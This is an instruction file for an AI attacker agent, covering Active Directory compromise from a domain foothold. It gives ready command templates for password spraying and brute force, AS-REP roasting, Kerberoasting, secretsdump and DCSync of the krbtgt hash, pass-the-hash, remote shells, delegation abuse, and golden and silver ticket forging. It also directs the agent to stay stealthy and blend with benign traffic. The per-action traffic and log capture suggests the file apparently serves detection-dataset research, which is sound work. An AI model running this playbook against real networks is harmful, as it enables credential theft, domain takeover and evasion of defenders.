---
name: ad-attack
description: Active Directory penetration attack skill for an attacker agent running on a domain-joined Windows host with an initial foothold. Covers the ATT&CK phases of Discovery, Credential Access, Lateral Movement, and Persistence using impacket, kerbrute, and nmap. Every technique id maps to exactly one command. The skill is object-driven: a long-term APT state file (state.json) holds three knowledge partitions (domain, hosts, users) plus runtime tickets/files, and every command parameter is resolved from a referenced object in that file. Each task follows a strict protocol: validate the environment with a pre-flight script, read state, wrap each atomic action with tshark/Sysmon capture, write results back to state, and roll back stale information. Use this skill whenever an attacker task requires domain reconnaissance, credential abuse, lateral movement, ticket attacks, or persistence.
---

# AD Attack Skill

## Overview

This skill drives an attacker agent that operates from a Windows host already joined to the target Active Directory domain. Attacks are organized by MITRE ATT&CK phase, advance slowly over a long period (APT-style), and reuse normal AD protocols (Kerberos, NTLM, LDAP, SMB, MS-RPC) so the resulting traffic and Windows events mix with benign business activity.

The skill is object-driven and stateful:

- `state.json` is the single source of truth for every command parameter. It holds three knowledge partitions — `domain`, `hosts`, and `users` — plus runtime `tickets`, `files`, `techniques`, and `notes`.
- Each technique id maps to exactly one command.
- Every atomic action is bracketed by traffic and log capture so the produced dataset is observable and labelable.

## Directory Layout

```
skill/attacker-skills/ad-attack/
├── SKILL.md                    # this file
├── config.json                 # interface, output dir, sysmon log (environment-specific)
├── state.json                  # long-term APT state (three knowledge partitions + runtime)
├── .gitignore                  # ignores runtime output
├── scripts/
│   ├── check_environment.py    # pre-flight validation
│   ├── state.py                # read/update state.json
│   ├── capture_traffic.py      # tshark start/stop
│   └── capture_logs.py         # Sysmon start/stop
└── output/                     # runtime pcap/evtx capture output (untracked)
```

All script invocations below use `python`; run them from the skill root so relative paths resolve correctly.

## Tool Naming & Windows Invocation

impacket is pure Python and runs natively on Windows; Kali is not required. The `impacket-` prefix used in the examples below is Kali's packaging style. On Windows, after `pip install impacket`, the same scripts are installed into Python's `Scripts` directory with a `.py` suffix:

| Kali name (used in this doc) | Windows `pip install impacket` |
|------------------------------|--------------------------------|
| `impacket-secretsdump` | `secretsdump.py` |
| `impacket-GetADUsers` | `GetADUsers.py` |
| `impacket-lookupsid` | `lookupsid.py` |
| `impacket-GetNPUsers` | `GetNPUsers.py` |
| `impacket-GetUserSPNs` | `GetUserSPNs.py` |
| `impacket-getTGT` | `getTGT.py` |
| `impacket-getST` | `getST.py` |
| `impacket-ticketer` | `ticketer.py` |
| `impacket-findDelegation` | `findDelegation.py` |
| `impacket-psexec` | `psexec.py` |
| `impacket-wmiexec` | `wmiexec.py` |
| `impacket-smbexec` | `smbexec.py` |
| `impacket-atexec` | `atexec.py` |
| `impacket-dcomexec` | `dcomexec.py` |

On Windows, run any impacket script with one of these equivalent forms (flags are identical on every platform):

```
python psexec.py -hashes :<ntlm-hash> <domain.name>/<user>@<target-ip>
python -m impacket.examples.psexec -hashes :<ntlm-hash> <domain.name>/<user>@<target-ip>
```

Prefer `python -m impacket.examples.<name>`: it works regardless of whether Python's `Scripts` directory is on the PATH. Installation on the attacker host:

```
pip install impacket
```

For ticket use, set `KRB5CCNAME` according to the active shell:

- PowerShell: `$env:KRB5CCNAME = "<user>.ccache"`
- cmd: `set KRB5CCNAME=<user>.ccache`

In PowerShell, wrap any password containing `$`, backtick, or other special characters in single quotes.

## Mandatory Execution Protocol

Every attack task MUST follow this exact sequence. Do not skip steps.

### Step 0 — Pre-flight check (once per day of attack activity)

Run:

```
python scripts/check_environment.py
```

- If the output reports `"ok": false`, do **not** proceed with any attack. Report the failure with the `errors` array from the output and stop this task. Never attempt to substitute a missing tool or hallucinate a command.
- If the output reports `"ok": true` (warnings are acceptable), continue to Step 1.

The check also guarantees impacket is actually runnable: it reports `python_executable` (the interpreter running the check — the same `python` the attack commands below will use) and `impacket.impacket_file` (where impacket lives), and it executes `python -m impacket.examples.secretsdump --help` as a live proof. If those do not line up, `ok` is `false`.

### Step 1 — Read the state file and resolve the object references

Read the long-term state:

```
python scripts/state.py read
```

The task references objects by name (e.g. `user svc_backup`, `host 192.168.14.71`). Resolve each reference to its fields in `state.json`. Every command parameter (domain name, DC IP, username, hash, ccache file, SPN, etc.) MUST come from the resolved object. Never invent credentials, hashes, hostnames, or targets. If a referenced object or its required field is missing from the state, first run the Discovery/Credential Access technique that produces it, then proceed.

### Step 2 — Wrap each atomic action with capture

For every single atomic attack action (one command = one action):

1. Start traffic capture:

   ```
   python scripts/capture_traffic.py start --label <technique-id>
   ```

2. Start log capture:

   ```
   python scripts/capture_logs.py start --label <technique-id>
   ```

3. Execute the attack command.
4. Stop log capture and export the evtx:

   ```
   python scripts/capture_logs.py stop
   ```

5. Stop traffic capture and finalize the pcap:

   ```
   python scripts/capture_traffic.py stop
   ```

`<technique-id>` is the stable identifier of the technique (see each technique below). The capture start/stop calls must bracket the action even when the action fails, so the failed attempt is still recorded.

### Step 3 — Update the state file

Write the outcome back into the state file using `state.py` (see the "Outputs" block of each technique). On success, mark the technique `done`; on failure, mark it `failed` and record the reason.

### Step 4 — Rollback on stale information

If a command fails because a state object's field is wrong (a hash that does not authenticate, a DC IP that is unreachable, a credential that is rejected), the object is stale. Mark it stale and re-collect it:

```
python scripts/state.py mark-stale <path-to-the-object>
```

Then re-run the technique that originally produced that object (see "Rollback" in each technique and the dedicated Rollback section at the end).

---

## State File Reference (state.json)

The state file is divided into three knowledge partitions (`domain`, `hosts`, `users`) plus runtime sections (`tickets`, `files`, `techniques`, `notes`).

### 1. Domain basic information — `domain`

| Field | Meaning |
|-------|---------|
| `name` | Domain FQDN, e.g. `corp.local` |
| `netbios` | NetBIOS (pre-Windows 2000) name |
| `dc_fqdn` | Primary domain controller FQDN (convenience pointer used for `-dc-ip` and ticket targets) |
| `dc_ip` | Primary domain controller IP address |
| `dcs[]` | All discovered domain controllers (see shape below) |
| `domain_sid` | Domain SID, e.g. `S-1-5-21-...` |
| `user_count` | Number of user accounts |
| `computer_count` | Number of computer accounts |
| `usernames[]` | Flat list of discovered SAM account names (kerbrute/enumeration working list) |
| `spns[]` | All discovered service principal names (see shape below) |
| `delegation[]` | Delegation relationships (see shape below) |
| `updated_at` | Last modification time |

`domain.dcs[]` item shape:

```
{"fqdn": "dc01.corp.local", "ip": "10.0.0.2", "is_pdc": true, "stale": false, "updated_at": ""}
```

`domain.spns[]` item shape:

```
{"spn": "cifs/dc01.corp.local", "account": "svc_sql", "ticket_file": "", "stale": false, "updated_at": ""}
```

`domain.delegation[]` item shape:

```
{"account": "dc01$", "type": "unconstrained|constrained", "allowed_spns": [], "stale": false, "updated_at": ""}
```

### 2. Host information — `hosts[]`

One object per domain controller, server, or member machine. Item shape:

```
{
  "machine_account": "DC01$",
  "fqdn": "dc01.corp.local",
  "ip": "10.0.0.2",
  "os": "Windows Server 2019",
  "role": "dc|server|member|unknown",
  "services": ["SMB", "LDAP", "DNS"],
  "open_ports": [88, 135, 389, 445],
  "compromised": false,
  "source": "discovery.host-scan",
  "stale": false,
  "updated_at": ""
}
```

### 3. User information — `users[]`

One object per account that carries any credential or attribute detail. Item shape:

```
{
  "username": "svc_backup",
  "upn": "svc_backup@corp.local",
  "sid": "S-1-5-21-...-1106",
  "password": "",
  "lm_hash": "",
  "ntlm_hash": "",
  "kerberos_rc4": "",
  "kerberos_aes128": "",
  "kerberos_aes256": "",
  "no_preauth": false,
  "logon_hosts": ["10.0.0.15"],
  "groups": ["Backup Operators"],
  "spns": ["MSSQLSvc/sql01.corp.local"],
  "is_domain_admin": false,
  "is_service_account": true,
  "source": "credential.dcsync",
  "stale": false,
  "updated_at": ""
}
```

Field notes:

- `password` is the plaintext password when known.
- `ntlm_hash` is the NTLM hash (second half of `LM:NT`). `lm_hash` holds the LM half when known.
- `kerberos_rc4` / `kerberos_aes128` / `kerberos_aes256` are Kerberos keys recovered from secretsdump/DCSync (`kerberos_rc4` equals `ntlm_hash`).
- `no_preauth` marks an account that does not require Kerberos preauthentication (AS-REP roastable).
- `logon_hosts` lists hosts where this account has been observed logging on.
- `groups` lists security groups the account belongs to.
- `spns` lists SPNs registered to this service account.

### 4. Wordlists — `wordlists`

Local dictionary files used as input to kerbrute/impacket:

| Field | Meaning |
|-------|---------|
| `usernames` | Path to the username wordlist `.txt` (one username per line) |
| `passwords` | Path to the password wordlist `.txt` (one password per line) |

Paths are relative to the skill root by default (or absolute). These files are operator-provided inputs; the fields store their locations so techniques that need a user/password list resolve the path from state instead of the prompt.

### 5. Runtime sections

- `tickets.tgt[]` / `service[]` / `golden[]` / `silver[]`: ticket cache files produced or forged during the campaign.
- `files[]`: interesting files discovered on hosts. Item shape: `{"path": "...", "description": "...", "stale": false, "updated_at": "..."}`.
- `techniques`: per-technique status and last result (keyed by technique id).
- `notes[]`: free-form observations. Item shape: `{"text": "..."}`.

Every object carries `stale` and `updated_at` (managed by `state.py mark-stale` / `unset-stale` / `touch`) so freshness is always visible.

---

## Command Templates

Task text follows one uniform, object-based form. The task generator is expected to receive the full `state.json` and pick concrete objects from it:

```
Use the ad-attack skill: using the <field> of <object>, execute <technique-id> against <target-ref>.
```

Reference grammar:

- `<object>`: `user <username|upn|sid>`, `host <ip|fqdn|machine_account>`, `domain`, or `wordlists`.
- `<field>`: the object attribute to use (e.g. `password`, `ntlm_hash`, `kerberos_aes256`, `usernames`, `passwords`, `spns`, `open_ports`, `os`, `dc_ip`, `domain_sid`).
- `<target-ref>`: `host <ip|fqdn|machine_account>`, `domain`, or `subnet <cidr>`.
- The `using the <field> of <object>` clause is omitted for techniques with no source object (orientation, host-scan, port-scan).

The technique id determines which field is actually consumed (see each technique's "Inputs"). The `using` clause just names the source object; the `against` clause names the target.

Examples:

```
Use the ad-attack skill: execute discovery.orientation against domain.
Use the ad-attack skill: execute discovery.host-scan against subnet 192.168.14.0/24.
Use the ad-attack skill: execute discovery.port-scan against host 192.168.14.71.
Use the ad-attack skill: using the usernames of wordlists, execute discovery.user-enum-kerbrute against domain.
Use the ad-attack skill: using the password of user alice, execute discovery.user-enum-ldap against domain.
Use the ad-attack skill: using the usernames of wordlists, execute credential.password-spray against domain.
Use the ad-attack skill: using the passwords of wordlists, execute credential.brute-user against domain.
Use the ad-attack skill: using the password of user alice, execute credential.kerberoast against domain.
Use the ad-attack skill: using the ntlm_hash of user svc_backup, execute lateral.pth-psexec against host 192.168.14.71.
Use the ad-attack skill: using the ntlm_hash of user administrator, execute lateral.overpass-the-hash against domain.
Use the ad-attack skill: using the password of user alice, execute lateral.exec-wmiexec against host 192.168.14.71.
Use the ad-attack skill: using the password of user alice, execute lateral.delegation-enum against domain.
Use the ad-attack skill: using the password of user svc_sql, execute lateral.delegation-s4u against host 192.168.14.71.
Use the ad-attack skill: using the ntlm_hash of user krbtgt, execute persistence.golden-ticket against domain.
Use the ad-attack skill: using the ntlm_hash of user svc_sql, execute persistence.silver-ticket against host 192.168.14.71.
```

The only parameter that may originate outside `state.json` is a single candidate password for spraying (the user/password wordlist paths themselves come from `wordlists`).

---

## Phase 0: Orientation

Before any attack, discover the domain context from the local foothold and store it.

- Technique id: `discovery.orientation`
- ATT&CK: T1082 (System Information Discovery), T1016 (System Network Configuration Discovery), T1482 (Domain Trust Discovery)

Commands:

```
whoami /upn
whoami /user
ipconfig /all
systeminfo
nltest /dclist:<domain>
net time /domain
```

Outputs:

```
python scripts/state.py set domain.name "<domain-fqdn>"
python scripts/state.py set domain.netbios "<netbios-name>"
python scripts/state.py set domain.domain_sid "<domain-sid>"
python scripts/state.py set domain.dc_ip "<primary-dc-ip>"
python scripts/state.py set domain.dc_fqdn "<primary-dc-fqdn>"
python scripts/state.py add domain.dcs '{"fqdn": "<dc-fqdn>", "ip": "<dc-ip>", "is_pdc": true}'
```

- `nltest /dclist:<domain>` lists **every** DC. Record each one with its own `add domain.dcs` entry (mark the PDC `is_pdc: true`), and set the singular `dc_ip`/`dc_fqdn` to the primary (PDC) so `-dc-ip` targets resolve.
- Derive `domain_sid` from `whoami /user`: take the user SID and drop the trailing RID (the part after the last `-`).
- This is information gathering, not an attack action, so no capture brackets are required.

---

# Phase 1: Discovery

## 1.1 Host Discovery (IP Scan)

- Technique id: `discovery.host-scan`
- ATT&CK: T1018 (Remote System Discovery)

Purpose: enumerate live hosts in the domain subnet.

Inputs: the target subnet from the `against subnet <cidr>` clause or `domain.dc_ip`.

Procedure (one atomic action):

```
nmap -sn <subnet>
```

For firewalled environments:

```
nmap -Pn -sn <subnet>
```

Outputs: append each live host to `hosts`:

```
python scripts/state.py add hosts '{"ip": "<ip>", "role": "unknown", "open_ports": [], "services": [], "compromised": false, "source": "discovery.host-scan"}'
```

Rollback: not applicable (a failed scan is simply re-run).

## 1.2 Single-Host Port Scan

- Technique id: `discovery.port-scan`
- ATT&CK: T1046 (Network Service Discovery)

Purpose: enumerate open ports and services on one host.

Inputs: the target host object from `hosts` (or `domain.dc_ip`).

Procedure (one atomic action):

```
nmap -Pn -sT -p- <target-ip>
```

Focused AD-port scan:

```
nmap -Pn -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,5986,9389 <target-ip>
```

Outputs: update the host object's `open_ports`, `services`, `os`, `role`:

```
python scripts/state.py merge hosts[<index>] '{"open_ports": [445, 135], "services": ["SMB", "MS-RPC"], "os": "<os>", "role": "<role>"}'
```

Rollback: not applicable.

## 1.3 Username Enumeration (kerbrute)

- Technique id: `discovery.user-enum-kerbrute`
- ATT&CK: T1087.002 (Account Discovery: Domain Account)

Purpose: enumerate valid domain usernames without credentials (Kerberos pre-authentication behavior).

Inputs: `domain.name`, `domain.dc_ip`, and `wordlists.usernames` (the username wordlist path).

Procedure (one atomic action):

```
kerbrute userenum -d <domain.name> --dc <domain.dc_ip> <userlist>
```

Outputs: append each discovered username to `domain.usernames`:

```
python scripts/state.py add domain.usernames '"<username>"'
```

Rollback: if a username list is later found to contain dead accounts, re-run this technique to refresh it.

## 1.4 Username Enumeration (LDAP)

- Technique id: `discovery.user-enum-ldap`
- ATT&CK: T1087.002 (Account Discovery: Domain Account)

Purpose: list all domain users via LDAP with valid credentials.

Inputs: a user object with `password` from `users`, plus `domain.dc_ip`.

Procedure (one atomic action):

```
impacket-GetADUsers -all -dc-ip <domain.dc_ip> <domain.name>/<user>:<password>
```

Outputs: append enumerated usernames to `domain.usernames` and set the count:

```
python scripts/state.py add domain.usernames '"<username>"'
python scripts/state.py set domain.user_count <n>
```

Rollback: if the credential is rejected, `mark-stale` the user object and refresh it.

## 1.5 SID Enumeration

- Technique id: `discovery.user-enum-sid`
- ATT&CK: T1087.002 (Account Discovery: Domain Account)

Purpose: enumerate accounts and SIDs with valid credentials.

Inputs: a user object with `password` from `users`, plus `domain.dc_ip`.

Procedure (one atomic action):

```
impacket-lookupsid <domain.name>/<user>:<password>@<domain.dc_ip>
```

Outputs: append enumerated accounts to `domain.usernames` and record SIDs on user objects:

```
python scripts/state.py add domain.usernames '"<username>"'
```

Rollback: if the credential is rejected, `mark-stale` the user object and refresh it.

---

# Phase 2: Credential Access

## 2.1 Password Spraying

- Technique id: `credential.password-spray`
- ATT&CK: T1110.003 (Brute Force: Password Spraying)

Purpose: test a single password against many accounts.

Inputs: `wordlists.usernames` (user list), `domain.name`, `domain.dc_ip`, and a candidate password (from `wordlists.passwords` or a single candidate in the task text).

Procedure (one atomic action):

```
kerbrute passwordspray -d <domain.name> --dc <domain.dc_ip> <userlist> <password>
```

Outputs: for each valid credential found, add a user object:

```
python scripts/state.py add users '{"username": "<user>", "password": "<password>", "source": "credential.password-spray"}'
```

Rollback: if a sprayed credential is later rejected, `mark-stale` the user object and re-spray or re-enumerate that account.

## 2.2 Single-Account Brute Force

- Technique id: `credential.brute-user`
- ATT&CK: T1110.001 (Brute Force: Password Guessing)

Purpose: brute-force a single account against a password list.

Inputs: a single username (from `domain.usernames`), `wordlists.passwords` (password list), `domain.name`, `domain.dc_ip`.

Procedure (one atomic action):

```
kerbrute bruteuser -d <domain.name> --dc <domain.dc_ip> <passlist> <user>
```

Outputs: add a user object for a valid credential:

```
python scripts/state.py add users '{"username": "<user>", "password": "<password>", "source": "credential.brute-user"}'
```

Rollback: if a credential is later rejected, `mark-stale` the user object and re-enumerate.

## 2.3 Brute Force

- Technique id: `credential.brute-force`
- ATT&CK: T1110 (Brute Force)

Purpose: brute-force many accounts against a password list.

Inputs: `wordlists.usernames` (user list), `wordlists.passwords` (password list), `domain.name`, `domain.dc_ip`.

Procedure (one atomic action):

```
kerbrute bruteforce -d <domain.name> --dc <domain.dc_ip> <passlist> <userlist>
```

Outputs: add a user object for each valid credential:

```
python scripts/state.py add users '{"username": "<user>", "password": "<password>", "source": "credential.brute-force"}'
```

Rollback: if a credential is later rejected, `mark-stale` the user object and re-enumerate.

## 2.4 AS-REP Roasting

- Technique id: `credential.asrep-roast`
- ATT&CK: T1558.004 (Steal or Forge Kerberos Tickets: AS-REP Roasting)

Purpose: request TGTs for accounts without Kerberos preauthentication.

Inputs: `wordlists.usernames` (user list), `domain.name`, `domain.dc_ip`.

Procedure (one atomic action):

```
impacket-GetNPUsers <domain.name>/ -usersfile <userlist> -dc-ip <domain.dc_ip> -format hashcat -outputfile asreproast.txt
```

Outputs: mark affected accounts `no_preauth` and record the output file:

```
python scripts/state.py add users '{"username": "<user>", "no_preauth": true, "source": "credential.asrep-roast"}'
python scripts/state.py add files '{"path": "asreproast.txt", "description": "AS-REP roast output"}'
```

Rollback: if an AS-REP entry fails to crack or is stale, re-run the roast for that user.

## 2.5 Kerberoasting

- Technique id: `credential.kerberoast`
- ATT&CK: T1558.003 (Steal or Forge Kerberos Tickets: Kerberoasting)

Purpose: request service tickets for SPNs and recover service account hashes.

Inputs: a user object with `password` from `users`, plus `domain.dc_ip`.

Procedure (one atomic action):

```
impacket-GetUserSPNs -dc-ip <domain.dc_ip> <domain.name>/<user>:<password> -request
```

Outputs: append discovered SPNs to `domain.spns` and mark the service account:

```
python scripts/state.py add domain.spns '{"spn": "<spn>", "account": "<service-account>"}'
python scripts/state.py add users '{"username": "<service-account>", "spns": ["<spn>"], "is_service_account": true, "source": "credential.kerberoast"}'
```

Rollback: if a stored SPN no longer resolves, `mark-stale` it and re-run Kerberoasting.

## 2.6 Credential Dumping (SAM/LSA)

- Technique id: `credential.dump-secrets`
- ATT&CK: T1003 (OS Credential Dumping)

Purpose: dump local account hashes from a host.

Inputs: a user object (use `password` or `ntlm_hash`) from `users`, plus the target host.

Procedure (one atomic action). Use `:<password>` if the object has a plaintext password, or `-hashes :<ntlm-hash>` if only the hash is known:

```
impacket-secretsdump <domain.name>/<user>:<password>@<target-ip>
```

```
impacket-secretsdump -hashes :<ntlm-hash> <domain.name>/<user>@<target-ip>
```

Outputs: append recovered accounts to `users` (set `ntlm_hash`/`kerberos_rc4`, leave `password` empty when only the hash is known) and record logon hosts:

```
python scripts/state.py add users '{"username": "<user>", "ntlm_hash": "<hash>", "kerberos_rc4": "<hash>", "logon_hosts": ["<target-ip>"], "source": "credential.dump-secrets"}'
```

Rollback: if a dumped hash later fails to authenticate, `mark-stale` it and re-dump.

## 2.7 DCSync

- Technique id: `credential.dcsync`
- ATT&CK: T1003.006 (OS Credential Dumping: DCSync)

Purpose: replicate directory secrets, including the `krbtgt` hash (required for golden tickets).

Inputs: an admin user object with `password`/`ntlm_hash` from `users`.

Procedure (one atomic action):

```
impacket-secretsdump <domain.name>/<admin-user>:<password>@<domain.dc_ip> -just-dc
```

`krbtgt` only (sub-variant of the same command):

```
impacket-secretsdump <domain.name>/<admin-user>:<password>@<domain.dc_ip> -just-dc-user krbtgt
```

Outputs: store the `krbtgt` hash and any new account hashes in `users`, and record the domain SID:

```
python scripts/state.py add users '{"username": "krbtgt", "ntlm_hash": "<hash>", "kerberos_rc4": "<hash>", "source": "credential.dcsync"}'
python scripts/state.py set domain.domain_sid "<domain-sid>"
```

Rollback: if the `krbtgt` hash is suspected stale (rotated), `mark-stale` the `krbtgt` user object and re-run DCSync.

---

# Phase 3: Lateral Movement

## 3.1 Pass-the-Hash (PsExec)

- Technique id: `lateral.pth-psexec`
- ATT&CK: T1550.002 (Use Alternate Authentication Material: Pass the Hash)

Purpose: authenticate to a host over SMB with a captured NTLM hash using PsExec.

Inputs: a user object with `ntlm_hash` from `users`, plus the target host.

Procedure (one atomic action):

```
impacket-psexec -hashes :<ntlm-hash> <domain.name>/<user>@<target-ip>
```

If the LM half is known, pass `-hashes <lm-hash>:<ntlm-hash>`.

Outputs: mark the target host `compromised`:

```
python scripts/state.py merge hosts[<index>] '{"compromised": true}'
```

Rollback: if authentication fails with the hash, `mark-stale` the user object and re-run `credential.dump-secrets` or `credential.dcsync` to refresh the hash.

## 3.2 Pass-the-Hash (WMI)

- Technique id: `lateral.pth-wmiexec`
- ATT&CK: T1550.002 (Pass the Hash)

Purpose: authenticate to a host over WMI with a captured NTLM hash.

Inputs: a user object with `ntlm_hash` from `users`, plus the target host.

Procedure (one atomic action):

```
impacket-wmiexec -hashes :<ntlm-hash> <domain.name>/<user>@<target-ip>
```

Outputs: mark the target host `compromised`.

Rollback: if authentication fails, `mark-stale` the user object and refresh the hash.

## 3.3 Pass-the-Hash (SMBExec)

- Technique id: `lateral.pth-smbexec`
- ATT&CK: T1550.002 (Pass the Hash)

Purpose: authenticate to a host over SMB named pipes with a captured NTLM hash.

Inputs: a user object with `ntlm_hash` from `users`, plus the target host.

Procedure (one atomic action):

```
impacket-smbexec -hashes :<ntlm-hash> <domain.name>/<user>@<target-ip>
```

Outputs: mark the target host `compromised`.

Rollback: if authentication fails, `mark-stale` the user object and refresh the hash.

## 3.4 Over-Pass-the-Hash

- Technique id: `lateral.overpass-the-hash`
- ATT&CK: T1550.002 (Pass the Hash, ticket-producing variant)

Purpose: request a Kerberos TGT directly from an NTLM hash, then use the ticket.

Inputs: a user object with `ntlm_hash` (or `kerberos_aes256`) from `users`.

Procedure (one atomic action):

```
impacket-getTGT <domain.name>/<user> -hashes :<ntlm-hash>
```

Import the resulting cache, then use it with `-k -no-pass` (Kerberos only, by FQDN):

```
$env:KRB5CCNAME = "<user>.ccache"
impacket-psexec -k -no-pass <domain.name>/<user>@<target-fqdn>
```

Outputs:

```
python scripts/state.py add tickets.tgt '{"principal": "<user>", "ccache_file": "<user>.ccache"}'
```

Rollback: if the TGT is expired or rejected, `mark-stale` the ticket entry and re-request it from a refreshed hash.

## 3.5 Remote Shell (WMI)

- Technique id: `lateral.exec-wmiexec`
- ATT&CK: T1047 (Windows Management Instrumentation)

Purpose: obtain a remote shell on a target over WMI with plaintext credentials.

Inputs: a user object with `password` from `users`, plus the target host.

Procedure (one atomic action):

```
impacket-wmiexec <domain.name>/<user>:<password>@<target-ip>
```

Outputs: mark the host `compromised`; record any files of interest under `files`.

Rollback: if WMI fails on a target (service disabled, port filtered), `mark-stale` the host object and re-run the port scan to pick an available method.

## 3.6 Remote Shell (SMBExec)

- Technique id: `lateral.exec-smbexec`
- ATT&CK: T1021.002 (SMB/Windows Admin Shares)

Purpose: obtain a remote shell on a target over SMB named pipes with plaintext credentials.

Inputs: a user object with `password` from `users`, plus the target host.

Procedure (one atomic action):

```
impacket-smbexec <domain.name>/<user>:<password>@<target-ip>
```

Outputs: mark the host `compromised`; record any files of interest under `files`.

Rollback: if SMBExec fails, `mark-stale` the host object and re-run the port scan.

## 3.7 Remote Shell (PsExec)

- Technique id: `lateral.exec-psexec`
- ATT&CK: T1021.002 (SMB/Windows Admin Shares), T1569.002 (Service Execution)

Purpose: obtain a remote shell on a target over SMB with plaintext credentials.

Inputs: a user object with `password` from `users`, plus the target host.

Procedure (one atomic action):

```
impacket-psexec <domain.name>/<user>:<password>@<target-ip>
```

Outputs: mark the host `compromised`; record any files of interest under `files`.

Rollback: if PsExec fails, `mark-stale` the host object and re-run the port scan.

## 3.8 Remote Shell (DCOM)

- Technique id: `lateral.exec-dcomexec`
- ATT&CK: T1021.003 (Distributed Component Object Model)

Purpose: obtain a remote shell on a target over DCOM with plaintext credentials.

Inputs: a user object with `password` from `users`, plus the target host.

Procedure (one atomic action):

```
impacket-dcomexec <domain.name>/<user>:<password>@<target-ip>
```

Outputs: mark the host `compromised`; record any files of interest under `files`.

Rollback: if DCOM fails, `mark-stale` the host object and re-run the port scan.

## 3.9 Remote Shell (AtExec)

- Technique id: `lateral.exec-atexec`
- ATT&CK: T1053.002 (Scheduled Task/Job: At)

Purpose: run a single scheduled command on a target over SMB with plaintext credentials.

Inputs: a user object with `password` from `users`, plus the target host and the command to run.

Procedure (one atomic action):

```
impacket-atexec <domain.name>/<user>:<password>@<target-ip> "cmd /c whoami"
```

Outputs: mark the host `compromised`; record any files of interest under `files`.

Rollback: if AtExec fails, `mark-stale` the host object and re-run the port scan.

## 3.10 Delegation Enumeration

- Technique id: `lateral.delegation-enum`
- ATT&CK: T1558 (Steal or Forge Kerberos Tickets)

Purpose: discover delegation relationships in the domain.

Inputs: a user object with `password` from `users`, plus `domain.dc_ip`.

Procedure (one atomic action):

```
impacket-findDelegation <domain.name>/<user>:<password> -dc-ip <domain.dc_ip>
```

Interpret: `Unconstrained` captures inbound TGTs; `Constrained` enables S4U2self/S4U2proxy.

Outputs:

```
python scripts/state.py add domain.delegation '{"account": "<account>", "type": "constrained", "allowed_spns": ["<spn>"]}'
```

Rollback: if a delegation relationship is stale, `mark-stale` the entry and re-run this technique.

## 3.11 Delegation Abuse (S4U)

- Technique id: `lateral.delegation-s4u`
- ATT&CK: T1558 (Steal or Forge Kerberos Tickets)

Purpose: abuse constrained delegation (S4U2self/S4U2proxy) to obtain a service ticket impersonating another user.

Inputs: a delegation account object (with `password`) from `users`, a target `spn` from `domain.spns`, and the user to impersonate.

Procedure (one atomic action):

```
impacket-getST -spn <spn> -impersonate <user-to-impersonate> -dc-ip <domain.dc_ip> <domain.name>/<delegation-account>:<password>
```

Then use the resulting ticket with `-k -no-pass`.

Outputs:

```
python scripts/state.py add tickets.service '{"spn": "<spn>", "impersonated_user": "<user-to-impersonate>", "ccache_file": "<user-to-impersonate>.ccache"}'
```

Rollback: if the S4U request is rejected, `mark-stale` the delegation entry and re-run `lateral.delegation-enum`.

---

# Phase 4: Persistence

## 4.1 Golden Ticket

- Technique id: `persistence.golden-ticket`
- ATT&CK: T1558.001 (Steal or Forge Kerberos Tickets: Golden Ticket)

Purpose: forge a TGT signed with the `krbtgt` hash for long-term domain access.

Inputs: the `krbtgt` user object's `ntlm_hash`, `domain.domain_sid`, `domain.name`.

Procedure (one atomic action):

```
impacket-ticketer -nthash <krbtgt-hash> -domain-sid <domain.domain_sid> -domain <domain.name> <username>
```

Use the forged ticket:

```
$env:KRB5CCNAME = "<username>.ccache"
impacket-psexec -k -no-pass <domain.name>/<username>@<domain.dc_fqdn>
```

Outputs:

```
python scripts/state.py add tickets.golden '{"principal": "<username>", "ccache_file": "<username>.ccache"}'
```

Rollback: if the ticket is rejected, the `krbtgt` hash or SID is stale — `mark-stale` the `krbtgt` user object / `domain.domain_sid` and re-run DCSync.

## 4.2 Silver Ticket

- Technique id: `persistence.silver-ticket`
- ATT&CK: T1558.002 (Steal or Forge Kerberos Tickets: Silver Ticket)

Purpose: forge a service ticket signed with a specific service account hash.

Inputs: a service account user object's `ntlm_hash`, `domain.domain_sid`, `domain.name`, target `spn`.

Procedure (one atomic action):

```
impacket-ticketer -nthash <service-hash> -domain-sid <domain.domain_sid> -domain <domain.name> -spn <spn> <username>
```

Use it against that service:

```
$env:KRB5CCNAME = "<username>.ccache"
impacket-psexec -k -no-pass <domain.name>/<username>@<target-fqdn>
```

Common SPNs: `cifs/<host-fqdn>`, `HOST/<host-fqdn>`, `ldap/<dc-fqdn>`.

Outputs:

```
python scripts/state.py add tickets.silver '{"spn": "<spn>", "principal": "<username>", "ccache_file": "<username>.ccache"}'
```

Rollback: if rejected, `mark-stale` the service account user object and re-run `credential.dump-secrets`.

---

## Rollback Rules

Rollback is triggered whenever a command fails because a state object's field is wrong or expired. The general procedure:

1. Mark the bad object stale:

   ```
   python scripts/state.py mark-stale <path-to-the-object>
   ```

2. Re-run the technique that originally produced the object (its "Rollback" note names the technique).
3. Overwrite the stale object with the fresh value and clear the flag:

   ```
   python scripts/state.py unset-stale <path>
   ```

Common stale cases:

| Symptom | Stale object | Re-collect with |
|---------|--------------|-----------------|
| Hash/password rejected | `users[n]` | `credential.dump-secrets` / `credential.dcsync` |
| DC unreachable / wrong IP | `domain.dc_ip` | `discovery.orientation` |
| Kerberos ticket rejected | `tickets.tgt[n]` etc. | the ticket's producing technique |
| SPN no longer resolves | `domain.spns[n]` | `credential.kerberoast` |
| Delegation relationship changed | `domain.delegation[n]` | `lateral.delegation-enum` |
| Port/service changed on a host | `hosts[n]` | `discovery.port-scan` |

Do not retry the same failing command more than once; diagnose staleness and re-collect instead. Keep the whole campaign low-volume and stealthy.
